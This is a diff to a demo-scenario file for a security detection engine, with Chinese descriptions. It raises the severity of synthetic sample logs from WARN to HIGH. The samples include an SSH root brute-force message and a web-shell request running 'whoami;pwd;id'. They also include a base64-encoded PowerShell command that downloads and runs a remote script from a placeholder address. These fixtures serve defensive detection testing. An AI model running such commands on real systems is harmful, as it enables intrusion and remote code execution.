@@ -40,7 +40,7 @@ SCENES = [
         "severity": "HIGH",
         "desc": "同一源 IP 在 60s 窗口内出现 5 次 SSH 登录失败 → AUTH-BRUTE（threshold 规则）",
         "logs": [
-            {"source": "auth", "host": "brute-demo-host", "severity": "WARN",
+            {"source": "auth", "host": "brute-demo-host", "severity": "HIGH",
              "msg": "Failed password for invalid user root from 203.0.113.77 port 51234 ssh2",
              "fields": {"src_ip": "203.0.113.77", "user": "root"}},
         ] * 5,
@@ -55,7 +55,7 @@ SCENES = [
         "severity": "HIGH",
         "desc": "powershell -EncodedCommand 内联执行（常见于无文件攻击投递）→ EXEC-SUSPICIOUS-SHELL",
         "logs": [
-            {"source": "edr", "host": "win-demo-01", "severity": "WARN",
+            {"source": "edr", "host": "win-demo-01", "severity": "HIGH",
              "msg": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= --s-enc",
              "fields": {"host": "win-demo-01", "user": "SYSTEM"}},
         ],
@@ -71,10 +71,10 @@ SCENES = [
         "severity": "CRITICAL",
         "desc": "nginx 进程拉起 /bin/sh（Web Shell 后门落地/利用）→ WEB-SHELL（演示热更新新增规则）",
         "logs": [
-            {"source": "web", "host": "linux-web-01", "severity": "WARN",
+            {"source": "web", "host": "linux-web-01", "severity": "HIGH",
              "msg": "cmd=whoami;pwd;id&path=/uploads/shell.jspx",
              "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx", "user": "www-data"}},
-            {"source": "web", "host": "linux-web-01", "severity": "WARN",
+            {"source": "web", "host": "linux-web-01", "severity": "HIGH",
              "msg": "nginx: worker process 1234 spawned /bin/sh -c whoami",
              "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx"}},
         ],
